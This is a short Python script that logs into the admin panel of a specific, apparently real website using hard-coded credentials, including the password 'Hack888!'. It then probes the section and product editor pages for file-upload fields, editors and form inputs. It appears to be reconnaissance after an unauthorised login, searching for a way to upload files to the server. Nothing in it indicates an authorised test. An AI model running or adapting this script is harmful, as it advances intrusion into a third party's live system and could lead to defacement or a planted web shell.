import requests

s = requests.Session()
s.get("http://bjhzsv.com/main/", timeout=10)
s.post("http://bjhzsv.com/main/a7chkuser.asp",
    data={"t1": "hermes", "t2": "Hack888!", "t3": "1234"},
    headers={"Referer": "http://bjhzsv.com/main/"}, timeout=10)

# Explore menu_edit2.asp (section editor)
print("=== menu_edit2.asp?id=63 (技术资料) ===")
r = s.get("http://bjhzsv.com/main/menu_edit2.asp?id=63", timeout=10)
t = r.content.decode("gb2312", errors="replace")
print("Size:", len(t))
# Look for file upload, editor
has_file = 'type="file"' in t.lower() or "enctype=\"multipart" in t.lower()
has_editor = "editor" in t.lower() or "ueditor" in t.lower() or "textarea" in t.lower()
print("File:", has_file, "Editor:", has_editor)
# Show forms
if "<form" in t.lower():
    import re
    actions = re.findall(r'action=["\']([^"\']+)["\']', t)
    inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', t)
    print("Form action:", actions)
    print("Form inputs:", inputs)
print(t[:1500])

# Try menu_edit.asp (product editor)
print("\n=== menu_edit.asp?id=4 ===")
r = s.get("http://bjhzsv.com/main/menu_edit.asp?id=4", timeout=10)
t = r.content.decode("gb2312", errors="replace")
print("Size:", len(t))
print(t[:500])
